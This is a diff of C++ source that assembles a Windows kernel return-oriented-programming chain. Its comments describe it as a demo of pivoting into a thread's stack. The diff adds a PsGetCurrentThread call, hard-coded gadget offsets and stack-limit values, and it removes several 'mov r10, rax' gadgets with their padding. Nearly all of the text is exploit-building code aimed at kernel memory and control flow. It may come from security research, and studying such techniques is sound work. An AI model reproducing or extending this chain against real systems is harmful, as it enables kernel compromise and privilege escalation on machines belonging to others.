@@ -82,6 +82,7 @@ int main()
 
     // pivot into thread's created stack demo
     // Grab stack limit
+
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
     KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
@@ -99,9 +100,6 @@ int main()
     // move rax into rbx to preserve it
     KernelStackManager.AddGadget(0x267743, "push rax; pop rbx; ret;");
     // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
-    // store rax in r10
-    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
     // read the value of the current stack offset global variable
     KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
@@ -139,8 +137,6 @@ int main()
     // same code as above - basically just get the value of CurrentStackOffsetAddress
     // and add it to rax. so rax = stacklimit + curr_stack_offset
     KernelStackManager.AddGadget(0x267743, "push rax; pop rbx; ret;");
-    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
     KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
